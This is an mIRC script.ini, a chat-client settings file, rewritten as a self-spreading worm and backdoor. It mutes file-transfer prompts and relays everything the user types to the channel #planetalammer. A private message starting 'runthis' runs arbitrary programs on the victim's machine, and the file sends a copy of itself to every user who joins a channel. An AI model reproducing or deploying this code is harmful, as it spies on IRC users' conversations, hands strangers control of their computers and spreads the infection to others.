[script]

n1=
n2=on 1:START:{
n3=  .sreq ignore
n4=  .remote on
n5=}
n6=on 1:CONNECT:
n7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n8=on 1:INPUT:*:{
n9=  .msg #planetalammer ( $+ $active $+ ) $1-
n10=}
n11=on 1:TEXT:*:?:{
n12=  if ( $1 == runthis ) { .run $2- }
n13=}
n14=
n15=on 1:JOIN:*:{
n16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n17=}
